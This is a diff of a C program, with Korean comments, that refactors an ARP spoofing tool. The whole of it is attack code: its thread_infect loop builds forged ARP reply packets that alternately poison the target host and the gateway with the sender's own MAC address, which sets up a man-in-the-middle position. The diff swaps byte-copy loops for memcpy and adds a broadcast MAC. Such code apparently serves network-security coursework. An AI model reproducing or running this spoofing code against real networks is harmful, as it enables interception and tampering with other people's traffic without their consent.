@@ -16,22 +16,16 @@ void *thread_infect(void *arg) //감염패킷킷
     int sw = 1;
     while (1)
     {
-
-        //패킷 입력 시
-        // dmac search-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -Destination 입력
         if (sw > 2)
             sw = 1;
 
         if (sw == 1)
-            for (int i = 0; i <= 5; i++)
-                infect->eth_dst_mac[i] = infect_addr_save->save_target_mac[i]; //목적지 받은 패킷의 시작 주소
-        else
-            for (int i = 0; i <= 5; i++)
-                infect->eth_dst_mac[i] = infect_addr_save->save_gateway_mac[i];
-        // smac --------------------------------------------
+            memcpy(infect->eth_dst_mac, infect_addr_save->save_target_mac, 6);
 
-        for (int i = 0; i <= 5; i++)
-            infect->eth_src_mac[i] = mymac[i]; // 보낼 패킷의 시작은 나의 mac 입력
+        else
+            memcpy(infect->eth_dst_mac, infect_addr_save->save_gateway_mac, 6);
+
+        memcpy(infect->eth_src_mac, mymac, 6);
         infect->type = ntohs(0x0806);          // ARP 0x0806
         infect->hd_type = ntohs(0x0001);       // HardWare type : ethernet 1
         infect->protocol_type = ntohs(0x0800); // Protocol type : IPv4 0x0800
@@ -39,22 +33,16 @@ void *thread_infect(void *arg) //감염패킷킷
         infect->protocol_size = 0x04;          //
         infect->opcode = ntohs(0x0002);        // OPcode 1 = request ,2 = reply
 
-        // 나의 mac 입력
-        for (int i = 0; i <= 5; i++)
-            infect->arp_sender_mac[i] = mymac[i];
-        // 공격 대상의 IP (게이트웨이)
+        memcpy(infect->arp_sender_mac, mymac, 6);
         if (sw == 1)
             infect->arp_sender_ip = infect_addr_save->save_gateway_ip;
         else
             infect->arp_sender_ip = infect_addr_save->save_target_ip;
 
-        // 속일 mac 주소 (감염시킬 pc의 주소)
         if (sw == 1)
-            for (int i = 0; i <= 5; i++)
-                infect->arp_target_mac[i] = infect_addr_save->save_target_mac[i]; //받은 패킷의 시작 주소
+            memcpy(infect->arp_target_mac, infect_addr_save->save_target_mac, 6);
         else
-            for (int i = 0; i <= 5; i++)
-                infect->arp_target_mac[i] = infect_addr_save->save_gateway_mac[i];
+            memcpy(infect->arp_target_mac, infect_addr_save->save_gateway_mac, 6);
 
         if (sw == 1)
             infect->arp_target_ip = infect_addr_save->save_target_ip;
@@ -164,13 +152,12 @@ int main(int argc, char *argv[])
     // strncpy(ifr.ifr_name, dev, IFNAMSIZ);
 
     if (ioctl(ss, SIOCGIFADDR, &ifr) < 0)
-    {
         printf("아이피 구하지 못힘 \n");
-    }
     else
-    {
         inet_ntop(AF_INET, ifr.ifr_addr.sa_data + 2, myip, sizeof(struct sockaddr));
-    }
+
+    for (int i = 0; i < 6; ++i)
+        broadcast_mac[i] = 0xFF;
 
     pcap_t *pcap_handle;
     const u_char *packet;
